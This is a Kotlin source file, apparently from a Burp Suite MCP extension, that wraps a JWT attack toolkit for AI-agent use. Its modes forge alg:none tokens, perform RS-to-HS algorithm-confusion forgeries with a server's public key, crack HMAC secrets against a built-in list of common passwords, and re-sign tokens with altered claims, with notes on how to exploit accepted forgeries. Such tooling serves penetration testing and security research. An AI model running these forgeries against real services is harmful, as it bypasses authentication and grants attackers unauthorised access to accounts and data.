package com.burpmcp.ultra.bridge

import com.burpmcp.ultra.jwt.Jwt
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

/**
 * Thin MCP-facing wrapper over the pure [Jwt] toolkit. No Montoya dependency.
 */
class JwtBridge {

    /**
     * Runs a JWT attack [mode] against [token]:
     *  - `analyze`        — decode + flag offensive properties (alg family, kid/jku, exp).
     *  - `forge_none`     — produce alg:none variants (empty signature), with optional payload overrides.
     *  - `alg_confusion`  — RS->HS confusion: sign with [publicKey] as the HMAC secret.
     *  - `crack`          — recover the HMAC secret from [wordlist] (or a built-in common list).
     *  - `sign`           — (re)sign with [secret] under [alg], applying payload overrides (use after crack).
     */
    fun attack(
        token: String,
        mode: String,
        secret: String?,
        publicKey: String?,
        wordlist: List<String>?,
        overrides: JsonObject?,
        alg: String?
    ): JsonObject {
        return try {
            when (mode.lowercase()) {
                "analyze" -> {
                    val p = Jwt.decode(token) ?: return err("Not a decodable JWT")
                    buildJsonObject {
                        put("header", p.header)
                        put("payload", p.payload)
                        put("alg", p.alg)
                        put("issues", buildJsonArray {
                            Jwt.analyze(token).forEach {
                                add(buildJsonObject {
                                    put("id", it.id); put("severity", it.severity); put("detail", it.detail)
                                })
                            }
                        })
                    }
                }
                "forge_none" -> {
                    val variants = Jwt.forgeNone(token, overrides)
                    if (variants.isEmpty()) return err("Not a decodable JWT")
                    buildJsonObject {
                        put("variants", buildJsonArray { variants.forEach { add(it) } })
                        put("note", "Send each variant; if one is accepted, the server does not verify signatures.")
                    }
                }
                "alg_confusion" -> {
                    val key = publicKey ?: return err("alg_confusion requires public_key (the server's RSA/EC public key text, e.g. PEM)")
                    val forged = Jwt.resign(token, key, alg ?: "HS256", overrides) ?: return err("Could not forge token")
                    buildJsonObject {
                        put("token", forged)
                        put("note", "RS->HS confusion: signed with the public key as the HMAC secret. Works when the server uses one verify() across alg families.")
                    }
                }
                "crack" -> {
                    val list = wordlist?.takeIf { it.isNotEmpty() } ?: DEFAULT_SECRETS
                    val found = Jwt.crack(token, list)
                    buildJsonObject {
                        put("cracked", found != null)
                        if (found != null) put("secret", found)
                        put("candidates_tried", list.size)
                        if (found == null) put("note", "No match. Supply a larger wordlist via the 'wordlist' argument.")
                    }
                }
                "sign" -> {
                    val s = secret ?: return err("sign requires 'secret'")
                    val signed = Jwt.resign(token, s, alg ?: "HS256", overrides) ?: return err("Could not sign (bad token or alg)")
                    buildJsonObject { put("token", signed) }
                }
                else -> err("Unknown mode '$mode'. Use: analyze | forge_none | alg_confusion | crack | sign.")
            }
        } catch (e: Exception) {
            err("JWT attack failed: ${e.message}")
        }
    }

    private fun err(msg: String): JsonObject = buildJsonObject { put("error", msg) }

    companion object {
        /** Small built-in wordlist for quick HS-secret cracking when none is supplied. */
        val DEFAULT_SECRETS = listOf(
            "secret", "password", "123456", "admin", "changeme", "your-256-bit-secret", "jwt", "token",
            "key", "secretkey", "supersecret", "test", "qwerty", "letmein", "private", "jwtsecret",
            "my-secret", "s3cr3t", "default", "root"
        )
    }
}
